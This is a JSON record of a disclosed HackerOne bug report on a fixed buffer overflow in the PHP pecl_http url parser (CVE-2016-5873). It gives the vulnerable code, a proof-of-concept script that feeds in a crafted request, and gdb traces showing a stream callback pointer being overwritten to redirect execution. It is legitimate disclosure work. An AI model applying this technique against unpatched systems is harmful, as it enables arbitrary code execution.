{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-07-12T20:54:35.890Z", 
    "voters": [
        "kieran", 
        "dyabla", 
        "pulnz"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 121863, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-07-28T13:17:16.476Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Buffer overflow in HTTP url parsing functions", 
    "is_member_of_team?": null, 
    "vote_count": 3, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-08-11T20:54:36.032Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-05-01T01:09:09.696Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-01T01:09:09.696Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "rc0r", 
                "url": "/rc0r"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 935076, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "rc0r", 
                "url": "/rc0r"
            }, 
            "created_at": "2016-05-01T01:09:15.456Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-01T01:09:15.456Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 935077, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-12T20:54:35.956Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-12T20:54:35.956Z", 
            "actor": {
                "username": "rc0r", 
                "url": "/rc0r", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/153/fba7b238959b21ab47c816b08fcd463ce880a11f_medium.png?1457542865"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "first_to_agree": true, 
            "message": "CVE-2016-5873 was assigned for the original cause of the reported problem as summarized in the following commit:\n\nhttps://github.com/m6w6/ext-http/commit/3724cd76a28be1d6049b5537232e97ac567ae1f5", 
            "markdown_message": "<p>CVE-2016-5873 was assigned for the original cause of the reported problem as summarized in the following commit:</p>\n\n<p><a title=\"https://github.com/m6w6/ext-http/commit/3724cd76a28be1d6049b5537232e97ac567ae1f5\" href=\"/redirect?signature=2a2238ab61fb0b058ea2f582d0734e57c0dc449a&amp;url=https%3A%2F%2Fgithub.com%2Fm6w6%2Fext-http%2Fcommit%2F3724cd76a28be1d6049b5537232e97ac567ae1f5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/m6w6/ext-http/commit/3724cd76a28be1d6049b5537232e97ac567ae1f5</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1065873, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-28T13:17:16.529Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-28T13:17:16.529Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1092873, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-28T13:17:16.655Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-28T13:17:16.655Z", 
            "actor": {
                "username": "arice", 
                "url": "/arice", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ibb-php", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1092874, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "rc0r", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/rc0r", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/153/eb232471153ab2f2efb7a0df7cc970b1e9627d1a_small.png?1457542865"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 70, 
        "name": "Code Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -73187785.91598582, 
    "disclosed_at": "2016-07-28T13:17:16.569Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/121863", 
    "created_at": "2016-03-09T21:17:38.444Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>This bug report was submitted directly to the PHP bug tracker:<br>\n<a title=\"https://bugs.php.net/bug.php?id=71719\" href=\"/redirect?signature=39eb9645e43d5e859a1e15cd4075b11b98329f95&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D71719\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=71719</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The issue was verified and fixed on 2016-03-09. Updated HTTP packages 2.5.6 and 3.0.1 were released the same day.</p>\n\n<p>Following you find the bug description that has been reported to the PHP maintainers:</p>\n\n<h1 id=\"description\">Description</h1>\n\n<p>The HTTP url parsing functions allow overflowing a buffer with data originating from an arbitrary HTTP request. Affected are the <code>parse_*()</code> functions in <code>php_http_url.c</code> that are called from within <code>php_http_url_parse()</code>. Other parsing functions were not tested but might be affected as well.<br>\nThe problem occurs when non-printable characters contained in an URL are converted into percent-encoding. The <code>state-&gt;offset</code> used in these functions is incremented without sufficient checks<br>\nregarding the size of the allocated <code>state-&gt;buffer</code>.</p>\n\n<p>Example from <code>parse_mb()</code> in <code>php_http_url.c:781</code>:</p>\n<pre class=\"highlight c\"><code><span class=\"k\">static</span> <span class=\"kt\">size_t</span> <span class=\"nf\">parse_mb</span><span class=\"p\">(</span><span class=\"k\">struct</span> <span class=\"n\">parse_state</span> <span class=\"o\">*</span><span class=\"n\">state</span><span class=\"p\">,</span> <span class=\"p\">...)</span>\n<span class=\"p\">{</span>\n<span class=\"c1\">// [...]\n</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n                <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n\n                <span class=\"n\">PHP_HTTP_DUFF</span><span class=\"p\">(</span><span class=\"n\">consumed</span><span class=\"p\">,</span>\n                        <span class=\"n\">state</span><span class=\"o\">-&gt;</span><span class=\"n\">buffer</span><span class=\"p\">[</span><span class=\"n\">state</span><span class=\"o\">-&gt;</span><span class=\"n\">offset</span><span class=\"o\">++</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"sc\">&#39;%&#39;</span><span class=\"p\">;</span>\n                        <span class=\"n\">state</span><span class=\"o\">-&gt;</span><span class=\"n\">buffer</span><span class=\"p\">[</span><span class=\"n\">state</span><span class=\"o\">-&gt;</span><span class=\"n\">offset</span><span class=\"o\">++</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">parse_xdigits</span><span class=\"p\">[((</span><span class=\"kt\">unsigned</span> <span class=\"kt\">char</span><span class=\"p\">)</span> <span class=\"n\">ptr</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">])</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">4</span><span class=\"p\">];</span>\n                        <span class=\"n\">state</span><span class=\"o\">-&gt;</span><span class=\"n\">buffer</span><span class=\"p\">[</span><span class=\"n\">state</span><span class=\"o\">-&gt;</span><span class=\"n\">offset</span><span class=\"o\">++</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">parse_xdigits</span><span class=\"p\">[((</span><span class=\"kt\">unsigned</span> <span class=\"kt\">char</span><span class=\"p\">)</span> <span class=\"n\">ptr</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">])</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xf</span><span class=\"p\">];</span>\n                        <span class=\"o\">++</span><span class=\"n\">i</span><span class=\"p\">;</span>\n                <span class=\"p\">);</span>\n            <span class=\"p\">}</span>\n<span class=\"c1\">// [...]\n</span></code></pre>\n<p>A <code>php_stream_ops</code> structure is stored in memory adjacent to the <code>state-&gt;buffer</code>. This struct holds valid callback function pointers for stdio-like functions (see <code>php_streams.h:118</code>). During my tests it was possible to modify one of these function pointers, get it called and execute absolutely unrelated instructions within the php binary.<br>\n<strong>Thus I believe it&#39;s possible to use the described flaw to execute arbitrary code.</strong></p>\n\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p>PHP test script:</p>\n<pre class=\"highlight php\"><code>/*\n        http_message_parse.php\n        poc.req:\n        http://hlt99.blinkenshell.org/php/poc.req\n*/\n<span class=\"cp\">&lt;?php</span>\n <span class=\"nv\">$http_msg</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">http\\Message</span><span class=\"p\">(</span><span class=\"nb\">file_get_contents</span><span class=\"p\">(</span><span class=\"s2\">&quot;poc.req&quot;</span><span class=\"p\">),</span> <span class=\"kc\">false</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span>\n</code></pre>\n<p>PHP build configuration:</p>\n<pre class=\"highlight shell\"><code>./configure --enable-mysqlnd --enable-soap --with-openssl --with-sqlite3 --enable-raphf --enable-propro --with-http --with-zlib-dir --enable-zip --enable-intl <span class=\"o\">&amp;&amp;</span> make\n</code></pre>\n<p>Program state before buffer overflow:</p>\n<pre class=\"highlight plaintext\"><code>$ gdb ./sapi/cli/php\ngdb&gt; b streams.c:467\ngdb&gt; r http_message_parse.php\n[...]\nRAX: 0x10031c0 --&gt; 0x794560 (&lt;php_stdiop_write&gt;)\n        ^-- !! original callback function pointer\nRBX: 0x7ffff1870300\nRCX: 0x1 \nRDX: 0x7ffff1871078 \nRSI: 0x1 \nRDI: 0x7ffff1870300\nRBP: 0x3 \nRSP: 0x7fffffffab30 \nRIP: 0x78f5b4 (&lt;_php_stream_free+308&gt;:  call   QWORD PTR [rax+0x10])\nR8 : 0x1 \nR9 : 0x0 \nR10: 0x74000 \nR11: 0x1 \nR12: 0x0 \nR13: 0x102ea40 --&gt; 0x0 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n=&gt; 0x78f5b4 &lt;_php_stream_free+308&gt;: call   QWORD PTR [rax+0x10]\n[------------------------------------------------------------------------------]\n0x000000000078f5b4  467         ret = stream-&gt;ops-&gt;close(stream, preserve_handle ? 0 : 1);\n</code></pre>\n<p>Program state after <code>php_stream_ops</code> struct has been overwritten:</p>\n<pre class=\"highlight plaintext\"><code>gdb&gt; c\nRAX: 0x1004130 --&gt; 0x82f490 (&lt;ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER&gt;)\n        ^-- !! lower 3 bytes overwritten (halfbyte at offset 0x3f converted to hex char\n            !! and byte at offset 0x40 in poc.req\n            !! plus trailing 0x00 inserted by url parsing functions)\nRBX: 0x7ffff1870400\nRCX: 0x1 \nRDX: 0x2 \nRSI: 0x1 \nRDI: 0x7ffff1870400\nRBP: 0xb (&#39;\\x0b&#39;)\nRSP: 0x7fffffffa8a0\nRIP: 0x78f5b4 (&lt;_php_stream_free+308&gt;:  call   QWORD PTR [rax+0x10])\nR8 : 0x1 \nR9 : 0x0 \nR10: 0x682f377068702f73 (&#39;s/php7/h&#39;)\nR11: 0x170 \nR12: 0x0 \nR13: 0x102ea40 --&gt; 0x0 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n=&gt; 0x78f5b4 &lt;_php_stream_free+308&gt;: call   QWORD PTR [rax+0x10] \n[------------------------------------------------------------------------------]\n0x000000000078f5b4  467         ret = stream-&gt;ops-&gt;close(stream, preserve_handle ? 0 : 1);\n</code></pre>\n<p>Crash on an arbitrary instruction:</p>\n<pre class=\"highlight plaintext\"><code>gdb&gt; c\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x1004130 --&gt; 0x82f490 (&lt;ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER&gt;)\nRBX: 0x7ffff1870400\nRCX: 0x1 \nRDX: 0x2 \nRSI: 0x1 \nRDI: 0x7ffff1870400\nRBP: 0xb (&#39;\\x0b&#39;)\nRSP: 0x7fffffffa880\nRIP: 0x82f346 (&lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6&gt;:    movsxd rbx,DWORD PTR [r15+0x8])\nR8 : 0x1 \nR9 : 0x0 \nR10: 0x682f377068702f73 (&#39;s/php7/h&#39;)\nR11: 0x170 \nR12: 0x0 \nR13: 0x102ea40 --&gt; 0x0 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x82f340 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER&gt;:    push   rbp\n   0x82f341 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+1&gt;:    push   rbx\n   0x82f342 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+2&gt;:    sub    rsp,0x8\n=&gt; 0x82f346 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6&gt;:    movsxd rbx,DWORD PTR [r15+0x8]\n[------------------------------------------------------------------------------]\nStopped reason: SIGSEGV\nZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:44295\n44295        op1 = _get_zval_ptr_var(opline-&gt;op1.var, execute_data, &amp;free_op1);\n</code></pre>\n<h1 id=\"further-debug-info\">Further Debug Info</h1>\n\n<p>Backtrace right after overflow, before modified function pointers are called:</p>\n<pre class=\"highlight plaintext\"><code>gdb&gt; b php_http_url.c:1514\ngdb&gt; r\nBreakpoint 2, php_http_url_parse (\nstr=str@entry=0x7ffff185da05 &quot;5 HTTP/1.1\\nA\\265_eptA eg&quot;, &#39;\\262&#39; &lt;repeats 20 times&gt;, &quot;\u0572&quot;, &#39;\\262&#39; &lt;repeats 14 times&gt;, &quot;\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI&quot;, &#39;\\262&#39; &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\\215.0&quot;, len=len@entry=0x1, flags=flags@entry=0xffffffff)\nat /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514\n1514        if (!parse_hier(state)) {\ngdb&gt; bt\n#0  php_http_url_parse (\n    str=str@entry=0x7ffff185da05 &quot;5 HTTP/1.1\\nA\\265_eptA eg&quot;, &#39;\\262&#39; &lt;repeats 20 times&gt;, &quot;\u0572&quot;, &#39;\\262&#39; &lt;repeats 14 times&gt;, &quot;\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI&quot;, &#39;\\262&#39; &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\\215.0&quot;, len=len@entry=0x1, flags=flags@entry=0xffffffff)\n    at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514\n#1  0x0000000000736bf1 in php_http_info_parse (info=info@entry=0x7fffffffaa20, \n    pre_header=0x7ffff185da00 &quot;\\200\\254Td 5 HTTP/1.1\\nA\\265_eptA eg&quot;, &#39;\\262&#39; &lt;repeats 20 times&gt;, &quot;\u0572&quot;, &#39;\\262&#39; &lt;repeats 14 times&gt;, &quot;\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI&quot;, &#39;\\262&#39; &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\\215.0&quot;)\n    at /home/rc0r/tmp/php-src/ext/http/src/php_http_info.c:138\n#2  0x0000000000735838 in php_http_header_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, \n    flags=flags@entry=0x1, headers=0x7ffff1882090, callback_func=0x73a670 &lt;php_http_message_info_callback&gt;, \n    callback_arg=callback_arg@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_header_parser.c:151\n#3  0x0000000000740644 in php_http_message_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, flags=0x1, \n    message=message@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_message_parser.c:249\n#4  0x000000000073ba48 in php_http_message_parse (msg=0x7ffff1882070, msg@entry=0x0, \n    str=str@entry=0x7ffff185d8d8 &quot;\\200\\254Td 5 HTTP/1.1\\nA\\265_eptA eg&quot;, &#39;\\262&#39; &lt;repeats 20 times&gt;, &quot;\u0572&quot;, &#39;\\262&#39; &lt;repeats 14 times&gt;, &quot;\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI&quot;, &#39;\\262&#39; &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\\215.0&quot;, len=&lt;optimized out&gt;, greedy=&lt;optimized out&gt;)\n    at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:134\n#5  0x000000000073c82d in zim_HttpMessage___construct (execute_data=&lt;optimized out&gt;, return_value=&lt;optimized out&gt;)\n    at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:1061\n#6  0x00000000008560f2 in ZEND_DO_FCALL_SPEC_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:842\n#7  0x000000000081273b in execute_ex (ex=&lt;optimized out&gt;) at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:414\n#8  0x0000000000864567 in zend_execute (op_array=0x7ffff187d000, op_array@entry=0x7ffff185d860, return_value=return_value@entry=0x7ffff1813030)\n    at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:458\n#9  0x00000000007d4ee4 in zend_execute_scripts (type=type@entry=0x8, retval=0x7ffff1813030, retval@entry=0x0, file_count=file_count@entry=0x3)\n    at /home/rc0r/tmp/php-src/Zend/zend.c:1427\n#10 0x0000000000778b90 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd260) at /home/rc0r/tmp/php-src/main/main.c:2487\n#11 0x0000000000866194 in do_cli (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:974\n#12 0x0000000000443b98 in main (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:1350\n</code></pre>", 
    "vulnerability_information": "This bug report was submitted directly to the PHP bug tracker:\n<https://bugs.php.net/bug.php?id=71719>\n\nThe issue was verified and fixed on 2016-03-09. Updated HTTP packages 2.5.6 and 3.0.1 were released the same day.\n\nFollowing you find the bug description that has been reported to the PHP maintainers:\n\n\n# Description\n\nThe HTTP url parsing functions allow overflowing a buffer with data originating from an arbitrary HTTP request. Affected are the `parse_*()` functions in `php_http_url.c` that are called from within `php_http_url_parse()`. Other parsing functions were not tested but might be affected as well.\nThe problem occurs when non-printable characters contained in an URL are converted into percent-encoding. The `state->offset` used in these functions is incremented without sufficient checks\nregarding the size of the allocated `state->buffer`.\n\nExample from `parse_mb()` in `php_http_url.c:781`:\n\n```c\nstatic size_t parse_mb(struct parse_state *state, ...)\n{\n// [...]\n    } else {\n                int i = 0;\n\n                PHP_HTTP_DUFF(consumed,\n                        state->buffer[state->offset++] = '%';\n                        state->buffer[state->offset++] = parse_xdigits[((unsigned char) ptr[i]) >> 4];\n                        state->buffer[state->offset++] = parse_xdigits[((unsigned char) ptr[i]) & 0xf];\n                        ++i;\n                );\n            }\n// [...]\n```\n\nA `php_stream_ops` structure is stored in memory adjacent to the `state->buffer`. This struct holds valid callback function pointers for stdio-like functions (see `php_streams.h:118`). During my tests it was possible to modify one of these function pointers, get it called and execute absolutely unrelated instructions within the php binary.\n**Thus I believe it's possible to use the described flaw to execute arbitrary code.**\n\n\n# Proof of Concept\n\nPHP test script:\n\n```php\n/*\n        http_message_parse.php\n        poc.req:\n        http://hlt99.blinkenshell.org/php/poc.req\n*/\n<?php\n $http_msg = new http\\Message(file_get_contents(\"poc.req\"), false);\n?>\n```\n\nPHP build configuration:\n\n```bash\n./configure --enable-mysqlnd --enable-soap --with-openssl --with-sqlite3 --enable-raphf --enable-propro --with-http --with-zlib-dir --enable-zip --enable-intl && make\n```\n\nProgram state before buffer overflow:\n\n    $ gdb ./sapi/cli/php\n    gdb> b streams.c:467\n    gdb> r http_message_parse.php\n    [...]\n    RAX: 0x10031c0 --> 0x794560 (<php_stdiop_write>)\n            ^-- !! original callback function pointer\n    RBX: 0x7ffff1870300\n    RCX: 0x1 \n    RDX: 0x7ffff1871078 \n    RSI: 0x1 \n    RDI: 0x7ffff1870300\n    RBP: 0x3 \n    RSP: 0x7fffffffab30 \n    RIP: 0x78f5b4 (<_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10])\n    R8 : 0x1 \n    R9 : 0x0 \n    R10: 0x74000 \n    R11: 0x1 \n    R12: 0x0 \n    R13: 0x102ea40 --> 0x0 \n    R14: 0x0 \n    R15: 0x0\n    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n    [-------------------------------------code-------------------------------------]\n    => 0x78f5b4 <_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10]\n    [------------------------------------------------------------------------------]\n    0x000000000078f5b4\t467\t\t\tret = stream->ops->close(stream, preserve_handle ? 0 : 1);\n\nProgram state after `php_stream_ops` struct has been overwritten:\n\n    gdb> c\n    RAX: 0x1004130 --> 0x82f490 (<ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER>)\n            ^-- !! lower 3 bytes overwritten (halfbyte at offset 0x3f converted to hex char\n                !! and byte at offset 0x40 in poc.req\n                !! plus trailing 0x00 inserted by url parsing functions)\n    RBX: 0x7ffff1870400\n    RCX: 0x1 \n    RDX: 0x2 \n    RSI: 0x1 \n    RDI: 0x7ffff1870400\n    RBP: 0xb ('\\x0b')\n    RSP: 0x7fffffffa8a0\n    RIP: 0x78f5b4 (<_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10])\n    R8 : 0x1 \n    R9 : 0x0 \n    R10: 0x682f377068702f73 ('s/php7/h')\n    R11: 0x170 \n    R12: 0x0 \n    R13: 0x102ea40 --> 0x0 \n    R14: 0x0 \n    R15: 0x0\n    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n    [-------------------------------------code-------------------------------------]\n    => 0x78f5b4 <_php_stream_free+308>:\tcall   QWORD PTR [rax+0x10] \n    [------------------------------------------------------------------------------]\n    0x000000000078f5b4\t467\t\t\tret = stream->ops->close(stream, preserve_handle ? 0 : 1);\n\nCrash on an arbitrary instruction:\n\n    gdb> c\n    Program received signal SIGSEGV, Segmentation fault.\n    [----------------------------------registers-----------------------------------]\n    RAX: 0x1004130 --> 0x82f490 (<ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER>)\n    RBX: 0x7ffff1870400\n    RCX: 0x1 \n    RDX: 0x2 \n    RSI: 0x1 \n    RDI: 0x7ffff1870400\n    RBP: 0xb ('\\x0b')\n    RSP: 0x7fffffffa880\n    RIP: 0x82f346 (<ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6>:    movsxd rbx,DWORD PTR [r15+0x8])\n    R8 : 0x1 \n    R9 : 0x0 \n    R10: 0x682f377068702f73 ('s/php7/h')\n    R11: 0x170 \n    R12: 0x0 \n    R13: 0x102ea40 --> 0x0 \n    R14: 0x0 \n    R15: 0x0\n    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n    [-------------------------------------code-------------------------------------]\n       0x82f340 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER>:    push   rbp\n       0x82f341 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+1>:    push   rbx\n       0x82f342 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+2>:    sub    rsp,0x8\n    => 0x82f346 <ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6>:    movsxd rbx,DWORD PTR [r15+0x8]\n    [------------------------------------------------------------------------------]\n    Stopped reason: SIGSEGV\n    ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:44295\n    44295        op1 = _get_zval_ptr_var(opline->op1.var, execute_data, &free_op1);\n\n\n# Further Debug Info    \n\nBacktrace right after overflow, before modified function pointers are called:\n\n    gdb> b php_http_url.c:1514\n    gdb> r\n    Breakpoint 2, php_http_url_parse (\n    str=str@entry=0x7ffff185da05 \"5 HTTP/1.1\\nA\\265_eptA eg\", '\\262' <repeats 20 times>, \"\u0572\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\", len=len@entry=0x1, flags=flags@entry=0xffffffff)\n    at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514\n    1514\t\tif (!parse_hier(state)) {\n    gdb> bt\n    #0  php_http_url_parse (\n        str=str@entry=0x7ffff185da05 \"5 HTTP/1.1\\nA\\265_eptA eg\", '\\262' <repeats 20 times>, \"\u0572\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\", len=len@entry=0x1, flags=flags@entry=0xffffffff)\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514\n    #1  0x0000000000736bf1 in php_http_info_parse (info=info@entry=0x7fffffffaa20, \n        pre_header=0x7ffff185da00 \"\\200\\254Td 5 HTTP/1.1\\nA\\265_eptA eg\", '\\262' <repeats 20 times>, \"\u0572\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\")\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_info.c:138\n    #2  0x0000000000735838 in php_http_header_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, \n        flags=flags@entry=0x1, headers=0x7ffff1882090, callback_func=0x73a670 <php_http_message_info_callback>, \n        callback_arg=callback_arg@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_header_parser.c:151\n    #3  0x0000000000740644 in php_http_message_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, flags=0x1, \n        message=message@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_message_parser.c:249\n    #4  0x000000000073ba48 in php_http_message_parse (msg=0x7ffff1882070, msg@entry=0x0, \n        str=str@entry=0x7ffff185d8d8 \"\\200\\254Td 5 HTTP/1.1\\nA\\265_eptA eg\", 